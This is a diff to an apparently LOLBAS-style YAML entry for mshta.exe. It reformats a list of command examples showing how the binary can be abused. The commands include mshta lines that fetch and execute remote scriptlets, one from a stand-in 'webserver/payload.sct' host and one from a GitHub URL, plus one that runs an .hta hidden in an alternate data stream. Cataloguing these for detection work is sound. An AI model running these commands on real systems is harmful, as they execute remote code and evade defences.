@@ -7,10 +7,11 @@ Categories: []
 Commands:
   - Command: mshta.exe evilfile.hta
     Description: ''
-  - Command: mshta vbscript:Close(Execute("GetObject(""script:https[:]//webserver/payload[.]sct"")"))
+  - Command: mshta.exe vbscript:Close(Execute("GetObject(""script:https[:]//webserver/payload[.]sct"")"))
     Description: ''
-  - Command: "mshta.exe javascript:a=GetObject(\"script:https://raw.githubusercontent.com/api0cradle/LOLBAS/master/OSBinaries/Payload/Mshta_calc.sct\"\
-      ).Exec();close();     \n    \nmshta \"C:\\ads\\file.txt:file.hta\""
+  - Command: mshta.exe javascript:a=GetObject("script:https://raw.githubusercontent.com/api0cradle/LOLBAS/master/OSBinaries/Payload/Mshta_calc.sct").Exec();close();
+    Description: ''
+  - Command: mshta.exe "C:\ads\file.txt:file.hta"
     Description: ''
 Full Path:
   - C:\Windows\System32\mshta.exe
